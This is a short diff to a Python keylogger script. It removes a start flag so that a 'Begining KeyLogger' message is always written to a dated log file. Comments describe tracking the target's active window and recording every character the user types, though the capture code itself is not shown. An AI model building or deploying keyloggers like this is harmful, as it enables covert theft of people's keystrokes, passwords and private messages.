@@ -24,16 +24,12 @@ curr_date = datetime.now().strftime('%Y-%b-%d')
 path_log = "C:\\Users\\yourpath\\"+curr_date+".txt"
 # the current window the target is on, e.g. notepad, google chrome, etc..:
 program_name = ""
-# Starting message when program begins
-program_start = 0
 
 # prints starting message indicating keylogger has begun
-if program_start == 0:
-    data_log = open(path_log, "a")
-    data_log.write("\n\nBegining KeyLogger...")
-    print("\n\nBegining KeyLogger...")
-    program_start = 1
-    data_log.close()
+data_log = open(path_log, "a")
+data_log.write("\n\nBegining KeyLogger...")
+print("\n\nBegining KeyLogger...")
+data_log.close()
 
 
 # Records every character typed by the user and stores it into the log file
